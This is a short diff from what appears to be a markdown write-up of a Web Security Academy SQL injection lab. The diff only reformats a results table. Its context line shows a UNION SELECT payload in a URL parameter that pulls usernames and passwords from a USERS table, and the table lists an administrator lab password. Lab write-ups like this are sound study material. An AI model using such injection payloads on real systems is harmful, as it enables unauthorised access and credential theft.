@@ -250,6 +250,7 @@ https://acf91fd61fdb866c80560c7100da00ce.web-security-academy.net/filter
 ?category=Pets' union select USERNAME_SZEHOW,PASSWORD_TDJNHV from USERS_ADMDFI --
 ```
 
-| USERNAME_SZEHOW | PASSWORD_TDJNHV      |
-| :-------------- | -------------------- |
-| administrator   | 8qib221yweviflt6sqyr |
+> | USERNAME_SZEHOW | PASSWORD_TDJNHV      |
+> | :-------------- | -------------------- |
+> | administrator   | 8qib221yweviflt6sqyr |
+
